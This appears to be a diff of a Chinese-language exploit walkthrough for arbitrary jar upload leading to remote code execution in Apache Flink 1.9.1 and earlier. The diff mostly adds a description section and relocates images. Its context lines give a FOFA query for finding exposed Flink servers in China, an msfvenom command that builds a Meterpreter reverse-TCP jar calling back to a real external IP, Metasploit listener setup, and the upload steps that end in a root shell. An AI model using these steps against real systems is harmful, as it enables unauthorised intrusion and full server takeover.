@@ -1,5 +1,13 @@
 # Apache Flink <= 1.9.1(最新版本) 远程代码执行
 
+## 漏洞描述
+
+近日,有安全研究员公开了一个Apache Flink的任意Jar包上传导致远程代码执行的漏洞.
+
+##  影响范围
+
+Apache Flink  <= 1.9.1(最新版本)
+
 ## FOFA
 
 ```fofa
@@ -7,7 +15,7 @@ FOFA 语句
 app="Apache-Flink" && country="CN"
 ```
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-1.png)
+![](image/flink-1.png)
 
 国内还是很多使用 `Apache Flink` 的，大概有1000的数量左右
 
@@ -15,11 +23,11 @@ app="Apache-Flink" && country="CN"
 
 随便打开一个使用 Apache Flink 的网站，打开后页面为这样子
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-2.png)
+![](image/flink-2.png)
 
 点击查看文件上传页面
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-3.png)
+![](image/flink-3.png)
 
 
 
@@ -31,7 +39,7 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123  LPORT=4444 -f jar 
 
 点击 Add 上传 jar 文件
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-4.png)
+![](image/flink-4.png)
 
 监听端口
 
@@ -47,12 +55,12 @@ lport => 4444
 msf6 exploit(multi/handler) > run
 ```
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-6.png)
+![](image/flink-6.png)
 
 点击下 submit 
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-5.png)
+![](image/flink-5.png)
 
 反弹回来一个root 权限shell
 
-![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-7.png)
+![](image/flink-7.png)
